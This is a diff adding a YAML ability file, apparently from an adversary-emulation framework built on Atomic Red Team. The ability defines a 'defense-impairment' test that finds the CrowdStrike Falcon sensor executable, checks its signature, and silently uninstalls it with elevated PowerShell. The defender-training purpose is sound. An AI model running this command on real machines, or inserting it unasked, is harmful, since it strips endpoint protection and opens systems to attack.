@@ -1,0 +1,39 @@
+- id: b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297
+  name: Uninstall Crowdstrike Falcon on Windows
+  description: Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not
+    provided as an argument we need to search for it. Since the executable is located
+    in a folder named with a random guid we need to identify it before invoking the
+    uninstaller.
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: if (Test-Path "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe")
+          {. "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe"
+          /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package
+          Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature
+          -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList
+          -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1685
+  - defense-impairment
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      falcond_path:
+        description: The Crowdstrike Windows Sensor path. The Guid always changes.
+        type: path
+        default: C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe
+    technique_created: '2026-04-14T22:53:26.949Z'
+    atomic_guid: b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297
+    import_timestamp: '2026-05-02T05:00:41.569029Z'
